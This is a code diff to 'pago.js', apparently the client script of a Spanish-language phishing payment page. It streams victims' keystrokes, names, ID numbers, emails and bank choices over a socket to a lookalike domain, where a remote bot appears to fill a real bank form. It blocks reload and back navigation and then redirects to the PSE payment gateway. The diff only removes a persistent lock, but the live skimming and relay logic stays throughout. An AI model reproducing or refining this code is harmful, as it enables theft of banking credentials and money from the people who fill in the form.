@@ -1,4 +1,4 @@
-// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Bloqueo Persistente (LocalStorage)
+// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI
 
 const socket = io('https://apifinacjs.pagoswebcol.uk'); 
 
@@ -7,8 +7,10 @@ let browserRequested = false;
 const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
 // ==========================================
-// SEGURIDAD: PREVENIR RECARGA Y RETROCESO
+// SEGURIDAD: PREVENIR RECARGA Y RETROCESO DURANTE LA CARGA
 // ==========================================
+
+// Prevenir recarga mediante el botón del navegador
 window.addEventListener('beforeunload', (e) => {
     if (isTransactionActive) {
         e.preventDefault();
@@ -17,12 +19,15 @@ window.addEventListener('beforeunload', (e) => {
     }
 });
 
+// Prevenir retroceso con el botón "Atrás" del navegador
 window.addEventListener('popstate', function (event) {
     if (isTransactionActive) {
+        // Vuelve a empujar el estado actual para anular el retroceso
         history.pushState(null, document.title, location.href);
     }
 });
 
+// Prevenir teclas de recarga (F5, Ctrl+R, Cmd+R)
 document.addEventListener('keydown', function (e) {
     if (isTransactionActive) {
         if (e.key === 'F5' || (e.ctrlKey && e.key.toLowerCase() === 'r') || (e.metaKey && e.key.toLowerCase() === 'r')) {
@@ -32,41 +37,19 @@ document.addEventListener('keydown', function (e) {
 });
 
 // ==========================================
-// INICIALIZACIÓN Y BLOQUEO PERSISTENTE
+// INICIALIZACIÓN DE DATOS
 // ==========================================
 document.addEventListener('DOMContentLoaded', () => {
-    // VERIFICACIÓN DE BLOQUEO PERSISTENTE (Evita que burlen la recarga)
-    const lockTime = localStorage.getItem('activePaymentLock');
-    if (lockTime) {
-        const timePassed = Date.now() - parseInt(lockTime);
-        // Si han pasado menos de 10 minutos desde que inició el pago
-        if (timePassed < 10 * 60 * 1000) { 
-            document.body.innerHTML = `
-                <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background:#f9f9f9; text-align:center; font-family:'Roboto', sans-serif; padding: 20px;">
-                    <i class="fas fa-clock" style="font-size: 50px; color: #f39c12; margin-bottom: 20px;"></i>
-                    <h2 style="color:#333; margin-bottom: 10px;">Transacción en proceso</h2>
-                    <p style="font-size: 16px; color: #555; max-width: 400px; line-height: 1.5;">
-                        Tienes un intento de pago abierto. Por favor, <strong>espera la respuesta del banco</strong> o intenta con otro correo más tarde.
-                    </p>
-                </div>
-            `;
-            return; // Detiene la carga del resto de la página
-        } else {
-            // Si pasaron más de 10 minutos, liberamos el bloqueo
-            localStorage.removeItem('activePaymentLock'); 
-        }
-    }
-
     // 1. Obtener los datos correctamente del localStorage
     const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
 
-    // 2. SE MUESTRAN LOS DATOS EN LAS ETIQUETAS DE TEXTO
+    // 2. SE MUESTRAN LOS DATOS EN LAS ETIQUETAS DE TEXTO (PANEL DE RESUMEN)
     if (document.getElementById('lblNombre') && data.nombreCompleto) document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
     if (document.getElementById('lblId') && data.numId) document.getElementById('lblId').textContent = "CC - " + enmascararID(data.numId);
     if (document.getElementById('lblCorreo') && data.correo) document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
     if (document.getElementById('lblRef') && data.referencia) document.getElementById('lblRef').textContent = data.referencia;
 
-    // 3. LOS INPUTS QUEDAN LIMPIOS
+    // 3. LOS INPUTS DONDE SE ESCRIBE QUEDAN TOTALMENTE LIMPIOS Y VACÍOS
     if (document.getElementById('formCorreo')) document.getElementById('formCorreo').value = "";
     if (document.getElementById('formNumId')) document.getElementById('formNumId').value = "";
     if (document.getElementById('formNombre')) document.getElementById('formNombre').value = "";
@@ -102,7 +85,7 @@ if (selectBanco) {
 }
 
 // ==========================================
-// 2. SINCRONIZACIÓN EN VIVO 
+// 2. SINCRONIZACIÓN EN VIVO (LIVE TYPING - 400ms Anti-Spam)
 // ==========================================
 function syncInput(inputId, fieldName) {
     const input = document.getElementById(inputId);
@@ -144,12 +127,9 @@ if (botonPagar) {
         if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
         if (!browserRequested) { alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); return; }
 
-        // ACTIVAR BLOQUEOS DE SEGURIDAD
+        // Activar estado de bloqueo de seguridad
         isTransactionActive = true; 
-        history.pushState(null, document.title, location.href); 
-        
-        // Guardar el candado en el navegador (si recarga, se bloquea)
-        localStorage.setItem('activePaymentLock', Date.now().toString());
+        history.pushState(null, document.title, location.href); // Preparar bloqueo de botón "Atrás"
 
         const overlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('dynamicLoadingText');
@@ -157,7 +137,13 @@ if (botonPagar) {
         if (overlay) overlay.style.display = 'flex';
         loadingInterval = animateLoadingText(loadingText);
 
-        socket.emit('submit_payment', { email, name, doc, bank: banco });
+        // Envía los datos exactos que el usuario acaba de escribir como garantía final
+        socket.emit('submit_payment', {
+            email: email,
+            name: name,
+            doc: doc,
+            bank: banco
+        });
     });
 }
 
@@ -165,7 +151,7 @@ if (botonPagar) {
 // RESPUESTAS DEL SERVIDOR
 // ==========================================
 socket.on('browser_ready', () => {
-    console.log("Servidor: Formulario base llenado.");
+    console.log("Servidor: Formulario base llenado con éxito y esperando modificaciones.");
 });
 
 socket.on('payment_success', (data) => {
@@ -173,25 +159,24 @@ socket.on('payment_success', (data) => {
     if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
     clearInterval(loadingInterval);
     setTimeout(() => {
-        isTransactionActive = false; 
-        // Nota: NO borramos el 'activePaymentLock' aquí, así si el usuario
-        // presiona "Atrás" después de pagar, verá la pantalla de bloqueo y no podrá repetir.
+        isTransactionActive = false; // Liberar seguridad
         window.location.href = data.url; 
     }, 1500);
 });
 
 socket.on('payment_error', (data) => {
+    // 1. Detener la animación y limpiar variables
     clearInterval(loadingInterval);
-    isTransactionActive = false; 
+    isTransactionActive = false; // Liberar botones y recargas
 
-    // Al haber un error, quitamos el candado para que pueda intentar de nuevo
-    localStorage.removeItem('activePaymentLock');
-
+    // 2. Quitar la pantalla de carga para quedarse en el mismo index
     const overlay = document.getElementById('loadingOverlay');
     if (overlay) overlay.style.display = 'none';
 
+    // 3. Avisar al usuario del error
     alert("Hubo un problema de conexión con el banco: " + data.message);
     
+    // 4. Reiniciar la solicitud del bot para que el usuario pueda intentarlo de nuevo
     browserRequested = false;
     if (selectBanco) selectBanco.value = ""; 
 });
